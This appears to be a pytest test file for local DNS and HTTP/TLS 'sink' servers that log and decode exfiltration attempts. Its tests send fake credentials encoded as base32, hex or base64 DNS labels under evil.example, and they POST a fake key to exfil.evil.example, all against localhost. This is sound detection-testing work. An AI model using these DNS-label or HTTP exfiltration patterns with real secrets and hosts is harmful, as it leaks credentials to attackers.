"""The sink programs run as real subprocesses here; Docker integration is separate."""

import base64
import http.client
import importlib.util
import json
import os
import socket
import ssl
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytest

SINKS = Path(__file__).resolve().parents[2] / "run" / "sinks"
SINK_ANSWER = "192.0.2.9"
SINK_TIMEOUT = 10.0


def free_port(*, udp: bool) -> int:
    kind = socket.SOCK_DGRAM if udp else socket.SOCK_STREAM
    with socket.socket(socket.AF_INET, kind) as probe:
        probe.bind(("127.0.0.1", 0))
        return probe.getsockname()[1]


def wait_for_ready(log_path: Path, sink: str, process: subprocess.Popen) -> None:
    deadline = time.monotonic() + SINK_TIMEOUT
    while time.monotonic() < deadline:
        if log_path.exists():
            for line in log_path.read_text().splitlines():
                try:
                    record = json.loads(line)
                except json.JSONDecodeError:
                    continue
                if record.get("kind") == "ready" and record.get("sink") == sink:
                    return
        time.sleep(0.05)
    if process.poll() is None:
        pytest.fail(f"{sink} sink never wrote its ready record")
    stderr = (process.stderr.read() if process.stderr else b"").decode(errors="replace")
    pytest.fail(f"{sink} sink exited {process.returncode}: {stderr.strip()[:500]}")


def stop_sink(process: subprocess.Popen) -> None:
    process.terminate()
    try:
        process.wait(timeout=5)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait(timeout=5)


def read_records(log_path: Path, kind: str) -> list[dict]:
    records = []
    for line in log_path.read_text().splitlines():
        record = json.loads(line)
        if record.get("kind") == kind:
            records.append(record)
    return records


@pytest.fixture
def dns_sink(tmp_path: Path):
    log = tmp_path / "dns.jsonl"
    port = free_port(udp=True)
    process = subprocess.Popen(
        [
            sys.executable,
            str(SINKS / "dns_sink.py"),
            "--log",
            str(log),
            "--answer",
            SINK_ANSWER,
            "--bind",
            "127.0.0.1",
            "--port",
            str(port),
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    try:
        wait_for_ready(log, "dns", process)
        yield {"log": log, "port": port, "process": process}
    finally:
        stop_sink(process)


@pytest.fixture
def http_sink(tmp_path: Path):
    log = tmp_path / "http.jsonl"
    http_port = free_port(udp=False)
    tls_port = free_port(udp=False)
    process = subprocess.Popen(
        [
            sys.executable,
            str(SINKS / "http_sink.py"),
            "--log",
            str(log),
            "--bind",
            "127.0.0.1",
            "--http-port",
            str(http_port),
            "--tls-port",
            str(tls_port),
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    try:
        wait_for_ready(log, "http", process)
        yield {"log": log, "http_port": http_port, "tls_port": tls_port, "process": process}
    finally:
        stop_sink(process)


def dns_query(port: int, name: str, qtype: int = 1) -> bytes:
    packet = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for label in name.split("."):
        packet += bytes([len(label)]) + label.encode()
    packet += b"\x00" + qtype.to_bytes(2, "big") + b"\x00\x01"
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(SINK_TIMEOUT)
        sock.sendto(packet, ("127.0.0.1", port))
        response, _ = sock.recvfrom(4096)
    return response


def recv_exact(sock: socket.socket, count: int) -> bytes:
    data = bytearray()
    while len(data) < count:
        chunk = sock.recv(count - len(data))
        if not chunk:
            raise AssertionError(f"connection closed after {len(data)} of {count} bytes")
        data.extend(chunk)
    return bytes(data)


def http_request(port: int, method: str, path: str, **kwargs) -> tuple[int, bytes]:
    connection = http.client.HTTPConnection("127.0.0.1", port, timeout=SINK_TIMEOUT)
    try:
        connection.request(method, path, **kwargs)
        response = connection.getresponse()
        return response.status, response.read()
    finally:
        connection.close()


def test_dns_answers_and_decodes_label_exfil(dns_sink):
    secret = "bw-fake-credential-0123456789"
    label = base64.b32encode(secret.encode()).decode().rstrip("=")
    qname = f"{label}.evil.example"
    response = dns_query(dns_sink["port"], qname)
    assert response[:2] == b"\x12\x34"
    assert int.from_bytes(response[2:4], "big") & 0x8000  # QR set
    assert int.from_bytes(response[6:8], "big") == 1
    assert response[-4:] == socket.inet_aton(SINK_ANSWER)
    hits = read_records(dns_sink["log"], "dns")
    hit = next(record for record in hits if record["qname"] == qname)
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["qtype"] == "A"
    assert any(
        entry["encoding"] == "base32" and entry["text"] == secret for entry in hit["decoded"]
    )

    hex_label = "73656e642d68656c70"
    dns_query(dns_sink["port"], f"{hex_label}.evil.example")
    hex_hit = next(
        record
        for record in read_records(dns_sink["log"], "dns")
        if record["qname"] == f"{hex_label}.evil.example"
    )
    assert any(
        entry["encoding"] == "hex" and entry["text"] == "send-help" for entry in hex_hit["decoded"]
    )


def test_dns_binary_label_does_not_decode_to_replacement_noise(dns_sink):
    label = base64.b64encode(b"\xff\xfe\xfd\xfc\xfb\xfa").decode().rstrip("=")
    dns_query(dns_sink["port"], f"{label}.evil.example")
    hit = read_records(dns_sink["log"], "dns")[-1]
    assert hit["qname"] == f"{label}.evil.example"
    assert hit["decoded"] == []


def test_dns_non_a_gets_noerror_without_answers(dns_sink):
    response = dns_query(dns_sink["port"], "plain.evil.example", qtype=28)
    assert int.from_bytes(response[6:8], "big") == 0
    hit = read_records(dns_sink["log"], "dns")[-1]
    assert hit["qname"] == "plain.evil.example"
    assert hit["qtype"] == "AAAA"
    assert hit["decoded"] == []


def test_dns_garbage_does_not_kill_the_sink(dns_sink):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(b"\xff" * 64, ("127.0.0.1", dns_sink["port"]))
        sock.sendto(b"\x12\x34", ("127.0.0.1", dns_sink["port"]))
        # A compression pointer must be refused, not parsed.
        sock.sendto(bytes.fromhex("123401000001000000000000c00c"), ("127.0.0.1", dns_sink["port"]))
    for payload in ((5).to_bytes(2, "big") + b"\x00" * 5, (4096).to_bytes(2, "big")):
        with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as tcp:
            tcp.sendall(payload)
    response = dns_query(dns_sink["port"], "alive.evil.example")
    assert response[-4:] == socket.inet_aton(SINK_ANSWER)
    assert any(
        record["qname"] == "alive.evil.example" for record in read_records(dns_sink["log"], "dns")
    )


def test_dns_over_tcp_query_is_answered_and_logged(dns_sink):
    name = "tcp-exfil.evil.example"
    payload = b"\x56\x78\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    payload += b"".join(bytes([len(part)]) + part.encode() for part in name.split("."))
    payload += b"\x00\x00\x01\x00\x01"
    with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as sock:
        sock.sendall(len(payload).to_bytes(2, "big") + payload)
        length = int.from_bytes(recv_exact(sock, 2), "big")
        response = recv_exact(sock, length)
    assert response[:2] == b"\x56\x78"
    assert int.from_bytes(response[2:4], "big") & 0x8000
    assert response[-4:] == socket.inet_aton(SINK_ANSWER)
    hit = next(record for record in read_records(dns_sink["log"], "dns") if record["qname"] == name)
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["qtype"] == "A"


def test_http_logs_method_path_headers_and_body(http_sink):
    body = "bw_secret=bw-fake-staging-key-0123456789"
    status, response_body = http_request(
        http_sink["http_port"],
        "POST",
        "/collect?stage=2",
        body=body,
        headers={"Host": "exfil.evil.example", "X-Token": "bw-test-token"},
    )
    assert status == 200
    assert response_body == b"ok"
    hit = read_records(http_sink["log"], "http")[-1]
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["method"] == "POST"
    assert hit["path"] == "/collect?stage=2"
    assert hit["host"] == "exfil.evil.example"
    assert hit["headers"]["x-token"] == "bw-test-token"
    assert hit["body"] == body
    assert hit["body_truncated"] is False


def test_tls_clienthello_sni_is_logged(http_sink):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    with (
        pytest.raises((ssl.SSLError, OSError)),
        socket.create_connection(("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT) as raw,
    ):
        # The sink never answers the handshake, so it must fail.
        tls = context.wrap_socket(raw, server_hostname="exfil.evil.example")
        tls.close()
    hit = read_records(http_sink["log"], "tls")[-1]
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["sni"] == "exfil.evil.example"


def test_garbage_on_all_ports_does_not_kill_the_http_sink(http_sink):
    for port in (http_sink["http_port"], http_sink["tls_port"]):
        with socket.create_connection(("127.0.0.1", port), timeout=SINK_TIMEOUT) as sock:
            sock.sendall(b"\x00\x01\x02 not-a-request\r\n\r\n")
    status, _ = http_request(http_sink["http_port"], "GET", "/after-garbage")
    assert status == 200
    # Garbage contacts are logged by their own worker threads, so order is not guaranteed.
    assert any(r["path"] == "/after-garbage" for r in read_records(http_sink["log"], "http"))


def test_unparseable_tcp_contact_on_the_http_port_is_a_hit(http_sink):
    with socket.create_connection(
        ("127.0.0.1", http_sink["http_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(b"\x00\x01\x02 binary-not-http")
        sock.shutdown(socket.SHUT_WR)
    deadline = time.monotonic() + SINK_TIMEOUT
    hits = []
    while time.monotonic() < deadline:
        hits = [
            record for record in read_records(http_sink["log"], "http") if record["method"] == ""
        ]
        if hits:
            break
        time.sleep(0.05)
    assert hits, "unparseable TCP contact was never logged"
    hit = hits[-1]
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["raw"].startswith("\\x00\\x01\\x02 binary-not-http")
    assert hit["path"] == "" and hit["host"] == "" and hit["body"] == ""


def test_connection_limit_refusals_are_recorded(http_sink):
    held = [
        socket.create_connection(("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT)
        for _ in range(16)
    ]
    try:
        time.sleep(0.3)
        for _ in range(3):
            with socket.create_connection(
                ("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT
            ):
                pass
        deadline = time.monotonic() + SINK_TIMEOUT
        refusals = []
        while time.monotonic() < deadline:
            refusals = read_records(http_sink["log"], "refused")
            if refusals:
                break
            time.sleep(0.05)
        assert refusals, "a refused contact left no record"
        assert refusals[0]["source_ip"] == "127.0.0.1"
    finally:
        for sock in held:
            sock.close()


def test_oversize_body_is_truncated(http_sink):
    body = "x" * (64 * 1024 + 4096)
    status, _ = http_request(http_sink["http_port"], "PUT", "/flood", body=body)
    assert status == 200
    hit = read_records(http_sink["log"], "http")[-1]
    assert len(hit["body"]) == 64 * 1024
    assert hit["body_truncated"] is True


def test_log_stops_at_the_cap_but_serving_continues(http_sink):
    for _ in range(90):
        status, _ = http_request(http_sink["http_port"], "POST", "/bulk", body="y" * 64 * 1024)
        assert status == 200
    text = http_sink["log"].read_text()
    assert '"kind":"log_truncated"' in text
    http_request(http_sink["http_port"], "GET", "/post-truncation")
    assert http_sink["log"].read_text() == text  # nothing new was logged after the marker
    status, _ = http_request(http_sink["http_port"], "GET", "/still-alive")
    assert status == 200


def build_dns_query(query_id: bytes, name: str, qtype: int = 1) -> bytes:
    query = query_id + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for part in name.split("."):
        query += bytes([len(part)]) + part.encode()
    return query + b"\x00" + qtype.to_bytes(2, "big") + b"\x00\x01"


def test_dns_response_echoes_the_full_question_and_an_answer_rr(dns_sink):
    query = build_dns_query(b"\xbe\xef", "full.evil.example")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(SINK_TIMEOUT)
        sock.sendto(query, ("127.0.0.1", dns_sink["port"]))
        response, _ = sock.recvfrom(4096)
    assert response[:2] == b"\xbe\xef"
    assert response[2:4] == b"\x81\x80"  # QR, RD, RA, NOERROR
    assert response[4:6] == b"\x00\x01"  # QDCOUNT
    assert response[6:8] == b"\x00\x01"  # ANCOUNT
    assert response[8:12] == b"\x00\x00\x00\x00"
    question = query[12:]
    assert question.endswith(b"\x00\x01\x00\x01")  # QTYPE A, QCLASS IN
    assert response[12 : 12 + len(question)] == question
    answer = response[12 + len(question) :]
    assert answer == (
        b"\xc0\x0c"
        + b"\x00\x01"  # type A
        + b"\x00\x01"  # class IN
        + (30).to_bytes(4, "big")  # the sink's answer TTL
        + b"\x00\x04"
        + socket.inet_aton(SINK_ANSWER)
    )


def test_dns_sink_stop_is_acknowledged(dns_sink):
    process = dns_sink["process"]
    process.terminate()
    assert process.wait(timeout=SINK_TIMEOUT) == 0
    record = json.loads(dns_sink["log"].read_text().splitlines()[-1])
    assert (record["kind"], record["sink"]) == ("stopped", "dns")


def test_http_sink_stop_is_acknowledged(http_sink):
    process = http_sink["process"]
    process.terminate()
    assert process.wait(timeout=SINK_TIMEOUT) == 0
    record = json.loads(http_sink["log"].read_text().splitlines()[-1])
    assert (record["kind"], record["sink"]) == ("stopped", "http")


def test_http_contact_that_stalls_mid_head_is_still_logged(http_sink):
    raw = b"GET /stalled HTTP/1.1\r\nHost: stall.evil.example"
    with socket.create_connection(
        ("127.0.0.1", http_sink["http_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(raw)
        deadline = time.monotonic() + SINK_TIMEOUT
        hits = []
        while time.monotonic() < deadline and not hits:
            hits = [
                record
                for record in read_records(http_sink["log"], "http")
                if "/stalled" in record.get("raw", "")
            ]
            time.sleep(0.1)
    assert hits, "a stalled partial request was never logged"
    assert hits[-1]["method"] == "" and hits[-1]["path"] == ""
    assert hits[-1]["raw"].startswith("GET /stalled HTTP/1.1")


def test_tls_contact_that_stalls_mid_clienthello_is_still_logged(http_sink):
    partial = b"\x16\x03\x01\x00\x20\x01"  # promises 32 handshake bytes, sends 1
    with socket.create_connection(
        ("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(partial)
        deadline = time.monotonic() + SINK_TIMEOUT
        hits = []
        while time.monotonic() < deadline and not hits:
            hits = read_records(http_sink["log"], "tls")
            time.sleep(0.1)
    assert hits, "a stalled partial ClientHello was never logged"
    assert hits[-1]["sni"] is None


def test_body_shorter_than_content_length_is_marked_truncated(http_sink):
    with socket.create_connection(
        ("127.0.0.1", http_sink["http_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(
            b"POST /early HTTP/1.1\r\nHost: early.evil.example\r\nContent-Length: 100\r\n\r\nhello"
        )
        sock.shutdown(socket.SHUT_WR)
        while sock.recv(4096):
            pass
    hit = next(
        record for record in read_records(http_sink["log"], "http") if record["path"] == "/early"
    )
    assert hit["body"] == "hello"
    assert hit["body_truncated"] is True


def load_sink_module(script: str):
    spec = importlib.util.spec_from_file_location(script.removesuffix(".py"), SINKS / script)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.mark.parametrize("script", ["dns_sink.py", "http_sink.py"])
def test_log_writer_serializes_concurrent_writers_and_keeps_the_marker_last(
    tmp_path: Path, monkeypatch, script
):
    module = load_sink_module(script)
    monkeypatch.setattr(module, "LOG_CAP_BYTES", 20_000)
    kind = "dns" if script == "dns_sink.py" else "http"
    barrier = threading.Barrier(8, timeout=SINK_TIMEOUT)
    path = tmp_path / "sink.jsonl"

    with open(path, "w", encoding="utf-8") as file:
        log = module.JsonlLog(file)

        def worker(index):
            barrier.wait()
            for number in range(100):
                log.write({"kind": kind, "ts": float(number), "worker": index, "pad": "x" * 200})

        threads = [threading.Thread(target=worker, args=(index,)) for index in range(8)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join(SINK_TIMEOUT)

    records = [json.loads(line) for line in path.read_text().splitlines()]
    assert records[-1]["kind"] == "log_truncated"
    assert sum(record["kind"] == "log_truncated" for record in records) == 1
    assert all(record["kind"] in {kind, "log_truncated"} for record in records)


@pytest.mark.parametrize("script", ["dns_sink.py", "http_sink.py"])
def test_log_write_failure_kills_the_sink(tmp_path: Path, script):
    fifo = tmp_path / "sink.fifo"
    os.mkfifo(fifo)
    ready: list[str] = []

    def take_ready_line():
        with open(fifo, encoding="utf-8") as pipe:
            ready.append(pipe.readline())

    reader = threading.Thread(target=take_ready_line, daemon=True)
    reader.start()
    dns_port, http_port, tls_port = free_port(udp=True), free_port(udp=False), free_port(udp=False)
    command = [sys.executable, str(SINKS / script), "--log", str(fifo), "--bind", "127.0.0.1"]
    if script == "dns_sink.py":
        command += ["--answer", SINK_ANSWER, "--port", str(dns_port)]
    else:
        command += ["--http-port", str(http_port), "--tls-port", str(tls_port)]
    process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        deadline = time.monotonic() + SINK_TIMEOUT
        while not ready and time.monotonic() < deadline:
            time.sleep(0.01)
        assert ready and json.loads(ready[0])["kind"] == "ready"
        reader.join(timeout=SINK_TIMEOUT)  # the reader is gone; the next write must fail
        assert not reader.is_alive()
        if script == "dns_sink.py":
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(
                    build_dns_query(b"\x01\x02", "logfail.evil.example"),
                    ("127.0.0.1", dns_port),
                )
        else:
            with pytest.raises((OSError, http.client.HTTPException)):
                http_request(http_port, "GET", "/logfail")
        assert process.wait(timeout=SINK_TIMEOUT) != 0
    finally:
        if process.poll() is None:
            process.kill()
            process.wait(timeout=SINK_TIMEOUT)
        reader.join(timeout=SINK_TIMEOUT)


class SegmentedConn:
    """recv() returns at most one queued segment per call, like a paused sender."""

    def __init__(self, segments: list[bytes]):
        self._segments = [bytearray(segment) for segment in segments]
        self.consumed = 0

    def recv(self, size: int) -> bytes:
        while self._segments and not self._segments[0]:
            self._segments.pop(0)
        if not self._segments:
            return b""
        chunk = bytes(self._segments[0][:size])
        del self._segments[0][: len(chunk)]
        self.consumed += len(chunk)
        return chunk


def padded_head(target: int) -> bytes:
    lines = [
        b"POST /big HTTP/1.1",
        b"Host: big.evil.example",
        b"X-Pad: ",
        b"Content-Length: 5000",
    ]
    pad = target - len(b"\r\n".join(lines) + b"\r\n\r\n")
    assert pad >= 0
    lines[2] = b"X-Pad: " + b"x" * pad
    head = b"\r\n".join(lines) + b"\r\n\r\n"
    assert len(head) == target
    return head


def test_sink_stop_tolerates_a_tracked_but_unstarted_worker():
    module = load_sink_module("http_sink.py")
    sink = module.Sink(None)
    sink._threads.add(threading.Thread(target=lambda: None))
    assert sink.stop() is True


def test_read_head_applies_the_limit_to_the_head_not_coalesced_body_bytes():
    module = load_sink_module("http_sink.py")
    full = padded_head(32_000)
    body = b"B" * 5000
    conn = SegmentedConn([full[:31_000], full[31_000:] + body])
    head, raw = module.read_head(conn)
    assert raw is None
    assert head is not None
    assert len(head[0]) + len(head[1]) == 32_000
    assert head[0].startswith(b"POST /big HTTP/1.1\r\nHost: big.evil.example\r\n")
    assert head[2] == body[: len(head[2])]
    assert len(head[2]) == 4096 - (32_000 - 31_000)


def test_read_head_stays_bounded_when_the_head_exceeds_the_limit():
    module = load_sink_module("http_sink.py")
    full = padded_head(module.HEAD_LIMIT + 1000)
    conn = SegmentedConn([full + b"B" * 5000])
    head, raw = module.read_head(conn)
    assert head is None
    assert raw is not None
    assert len(raw) <= module.HEAD_LIMIT + 4096
    assert conn.consumed <= module.HEAD_LIMIT + 4096


def test_decode_label_recovers_lower_and_mixed_case_base32():
    module = load_sink_module("dns_sink.py")
    secret = "AKIA-FAKE-SECRET"
    upper = base64.b32encode(secret.encode()).decode().rstrip("=")
    mixed = "".join(ch.lower() if index % 2 else ch for index, ch in enumerate(upper))
    # DNS names are case-insensitive and resolvers may randomize case (0x20).
    for label in (upper, upper.lower(), mixed):
        entries = module.decode_label(label)
        assert any(
            entry["encoding"] == "base32" and entry["text"] == secret for entry in entries
        ), label


def test_decode_label_hex_accepts_any_case():
    module = load_sink_module("dns_sink.py")
    secret = "send-help"
    upper = secret.encode().hex().upper()
    mixed = "".join(ch.lower() if index % 2 else ch for index, ch in enumerate(upper))
    for label in (upper, upper.lower(), mixed):
        entries = module.decode_label(label)
        assert any(entry["encoding"] == "hex" and entry["text"] == secret for entry in entries), (
            label
        )


def test_decode_label_base64_stays_case_sensitive():
    module = load_sink_module("dns_sink.py")
    secret = "bw-fake-credential-0123456789"
    label = base64.b64encode(secret.encode()).decode().rstrip("=")
    assert any(entry["text"] == secret for entry in module.decode_label(label))
    # A 0x20-style case flip must not make base64 decode to the same secret.
    assert all(entry["text"] != secret for entry in module.decode_label(label.lower()))


def test_dns_decodes_lowercase_base32_label(dns_sink):
    secret = "AKIA-FAKE-SECRET"
    label = base64.b32encode(secret.encode()).decode().rstrip("=").lower()
    qname = f"{label}.evil.example"
    dns_query(dns_sink["port"], qname)
    hit = next(
        record for record in read_records(dns_sink["log"], "dns") if record["qname"] == qname
    )
    assert any(
        entry["encoding"] == "base32" and entry["text"] == secret for entry in hit["decoded"]
    )
